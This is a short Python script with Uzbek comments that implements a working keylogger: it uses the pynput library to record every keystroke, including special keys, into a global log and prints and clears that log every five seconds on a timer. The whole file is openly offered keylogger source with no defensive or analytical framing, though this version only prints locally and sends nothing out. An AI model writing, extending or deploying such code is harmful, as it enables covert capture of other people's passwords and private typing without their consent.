#!/usr/bin/env python
import pynput.keyboard
import threading

log = ""

class Keylogger:
    def process_key_press(self, key):
        global log
        try:
            log += str(key.char)  # Agar tugma harf bo'lsa
        except AttributeError:
            if key == key.space:
                log += " "  # Bo'sh joy tugmasi uchun
            else:
                log += f" [{key}] "  # Maxsus tugmalar uchun

    def report(self):
        global log
        print(log)  # Logni chop etish
        log = ""  # Logni tozalash
        timer = threading.Timer(5, self.report)  # 5 soniyadan keyin qayta chaqirish
        timer.start()  # Timerni boshlash

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()  # Reportni boshlash
            keyboard_listener.join()  # Listenerni ishga tushirish

# Keylogger obyektini yaratish va boshlash
keylogger = Keylogger()
keylogger.start()
